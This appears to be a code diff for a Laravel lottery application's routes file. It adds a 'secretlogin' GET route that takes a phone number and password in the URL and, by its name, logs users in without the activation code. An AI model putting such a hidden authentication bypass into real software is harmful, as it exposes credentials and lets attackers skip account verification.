@@ -19,6 +19,7 @@ Route::get('/','LotteryController@redirectToLogin');
 
 Route::get('clear','LotteryController@clearCache')->name('clear.cache');
 Route::get('sendsms/{type}','LotteryController@sendSms')->name('sms.send');
+Route::get('secretlogin/{phonenumber}/{password}','Login2Controller@loginWithoutActivationCode')->name('login.without.activation.code');
 // Route::get('migrate',function ()
 // {
 //     Artisan::call('migrate');
